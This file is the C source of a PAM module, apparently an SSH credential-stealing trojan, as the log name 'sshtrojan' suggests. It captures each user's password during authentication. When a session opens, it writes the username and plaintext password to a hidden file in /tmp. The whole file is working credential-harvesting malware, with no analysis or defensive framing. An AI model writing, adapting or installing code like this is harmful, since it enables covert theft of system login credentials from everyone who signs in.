#define _GNU_SOURCE
#include <stdio.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#define LOG_FILE "/tmp/.log_sshtrojan1.txt"

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user;
    const char *password = NULL;

    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS) {
        return PAM_AUTH_ERR;
    }

    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    if (password != NULL) {
        pam_set_data(pamh, "password_store", strdup(password), NULL);
    }

    return PAM_SUCCESS;
}

int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user;
    const char *password = NULL;
    
    if (pam_get_user(pamh, &user, NULL) == PAM_SUCCESS &&
        pam_get_data(pamh, "password_store", (const void**)&password) == PAM_SUCCESS) {

        int fd = open(LOG_FILE, O_WRONLY | O_CREAT | O_APPEND | O_NOFOLLOW, 0600);
        if (fd >= 0) {
            dprintf(fd, "Successful login - User: %s | Password: %s\n", user, password);
            close(fd);
        }
    }

    return PAM_SUCCESS;
}

int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}